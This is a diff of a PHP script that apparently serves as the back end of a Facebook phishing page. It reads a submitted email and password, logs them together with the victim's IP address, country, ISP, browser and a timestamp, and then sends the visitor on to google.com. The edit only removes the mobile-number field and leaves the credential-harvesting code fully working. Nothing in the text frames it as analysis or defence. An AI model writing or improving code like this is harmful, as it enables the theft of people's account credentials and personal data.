@@ -2,7 +2,6 @@
 
     $email = $_GET['email'];
     $pass = $_GET['pass'];
-    $mob = $_GET['mob'];
 
     //echo $email.' - '.$pass;
 
@@ -42,7 +41,7 @@
                 $meta = '';
             }
 
-            fwrite($data, $meta.'<pre>----------------------------------------------<font color="#ff4757">('.$count.')</font>----------------------------------------------</pre><pre>| Facebook</pre><pre style="color:#5352ed;">| Email : '.$email.'</pre><pre style="color:#05c46b;">| Password : '.$pass.'</pre><pre style="color:#05c46b;">| Mobile : '.$mob.'</pre><pre>| ==========Info==========</pre><pre>| IP : '.$ip.'</pre><pre>| COUNTRY : '.$location.'</pre><pre>| HOST : '.$isp.'</pre><pre>| BROWSER : '.$useragent.'</pre><pre>| DATE : '.$time.'</pre>');
+            fwrite($data, $meta.'<pre>----------------------------------------------<font color="#ff4757">('.$count.')</font>----------------------------------------------</pre><pre>| Facebook</pre><pre style="color:#5352ed;">| Email : '.$email.'</pre><pre style="color:#05c46b;">| Password : '.$pass.'</pre><pre>| ==========Info==========</pre><pre>| IP : '.$ip.'</pre><pre>| COUNTRY : '.$location.'</pre><pre>| HOST : '.$isp.'</pre><pre>| BROWSER : '.$useragent.'</pre><pre>| DATE : '.$time.'</pre>');
             fclose($data);
 
             echo 'https://www.google.com';
